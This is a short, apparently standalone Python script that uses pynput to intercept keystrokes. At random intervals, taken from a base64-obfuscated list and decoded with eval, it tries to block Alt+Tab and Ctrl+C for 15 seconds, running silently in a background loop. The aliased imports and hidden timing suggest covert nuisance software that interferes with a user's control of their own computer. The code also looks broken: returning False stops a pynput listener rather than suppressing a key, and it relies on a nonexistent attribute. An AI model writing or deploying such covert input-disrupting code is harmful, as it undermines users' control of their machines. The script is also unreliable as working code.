import time as _t
import random as _r
import base64 as _b
import threading as _th
from pynput import keyboard

_i = eval(_b.b64decode(b'WzUsMzAsNDAsNTAsNjAsMTIwLDE4MF0=').decode())

class Blocker:
    def __init__(self):
        self.block = False
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def on_press(self, key):
        if not self.block:
            return True
        try:
            if key == keyboard.Key.tab and keyboard.Key.alt_l in keyboard._pressed_events:
                return False  # block Alt+Tab
            if key.char == 'c' and keyboard.Key.ctrl_l in keyboard._pressed_events:
                return False  # block Ctrl+C
        except AttributeError:
            pass
        return True

    def set_block(self, val):
        self.block = val

def run():
    blocker = Blocker()
    while True:
        _t.sleep(_r.choice(_i)*60)
        blocker.set_block(True)
        _t.sleep(15)
        blocker.set_block(False)

if __name__=="__main__":
    _th.Thread(target=run, daemon=True).start()
    while True:
        _t.sleep(99999)
